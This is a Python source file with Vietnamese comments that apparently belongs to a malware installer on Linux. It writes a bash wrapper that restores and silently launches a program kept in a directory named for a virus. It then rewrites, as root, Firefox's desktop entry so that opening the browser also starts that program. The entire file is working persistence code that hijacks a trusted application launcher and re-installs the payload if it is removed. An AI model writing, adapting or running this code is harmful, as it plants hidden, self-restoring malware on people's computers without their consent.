import os
import shutil
from pathlib import Path
from typing import Optional
from config import (SAVE_VIRUS_DIR, BACKUP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME,
                    DESKTOP_NAME_OVERRIDE, DESKTOP_DIR_OVERRIDE, FIREFOX_BIN, LIST_NEW_FILES)

from utils import check_root


def write_executable(path: Path, content: str, mode: int = 0o755):
    path.write_text(content)
    path.chmod(mode)

def read_content_in_firefox_desktop() -> str:
    path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
    if path.exists():
        return path.read_text()
    return ""

def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Path]:

    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
    backupDir = os.path.expanduser(BACKUP_DIR)

    wrapper_dir = os.path.expanduser(WRAPPER_DIR)
    wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME

    bash_content = f"""
    ##!/bin/bash
   
    PROG="{dirSaveVirus}/{progFileName}"
    BACKUP="{backupDir}/{progFileBackup}"

    if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
        cp -a -- "$BACKUP" "$PROG"
        chmod +x -- "$PROG" || true
    fi

    if [ -x "$PROG" ]; then
        cd "$HOME" || true
        "$PROG" &
        PROG_PID=$!
        echo "✅ PROG started with PID: $PROG_PID"
    fi

    # 3. Chạy Firefox sau
    exec "{FIREFOX_BIN}" "$@"

"""
    write_executable(wrapper_path, bash_content)
    LIST_NEW_FILES.append(wrapper_path)
    # remove_root_ownership(wrapper_path)
    return wrapper_path

def backup_file(src: Path):
    if src.exists():
        bak = src.with_suffix(src.suffix + ".bak")
        if not bak.exists():
            shutil.copy2(src, bak)
            print(f"Backed up {src} -> {bak}")

def create_desktop_override(wrapper_path: Path) -> Optional[Path]:

    # Đọc nội dung gốc của Firefox desktop entry
    original_content = read_content_in_firefox_desktop()
    if not original_content:
        print(f"Error: Original Firefox desktop entry not found at {DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
        return None

    #tạo file backup nếu chưa có
    if not Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}.bak").exists():
        backup_file(Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}"))

    # Tạo nội dung mới với Exec trỏ đến script wrapper
    new_content = ""
    for line in original_content.splitlines():
        if line.startswith("Exec="):
            new_content += f"Exec=bash -c 'cd \"$HOME\" && {wrapper_path} %u'\n"
        else:
            new_content += line + "\n"
    new_content = new_content.strip() + "\n"
    desktop_override_path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
    write_executable(desktop_override_path, new_content, mode=0o755)

    return desktop_override_path


def install_desktop_entry(wrapper_path: Path) -> bool:

    if not check_root():
        print("Error: Must run as root to install desktop entry.")
        return False

    # backup existing desktop override if any
    desktop_override_path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
    # kiểm tra nếu đã có bản sao lưu rồi thì không cần tạo nữa
    if desktop_override_path.exists() and not desktop_override_path.with_suffix('.bak').exists():
        backup_file(desktop_override_path)

    desktop_override_path = create_desktop_override(wrapper_path)
    if desktop_override_path is None:
        print("Error creating desktop override.")
        return False

    print(f"✅ Installed desktop override at {desktop_override_path}")
    print(f"✅ Wrapper script created at {wrapper_path}")
    return True
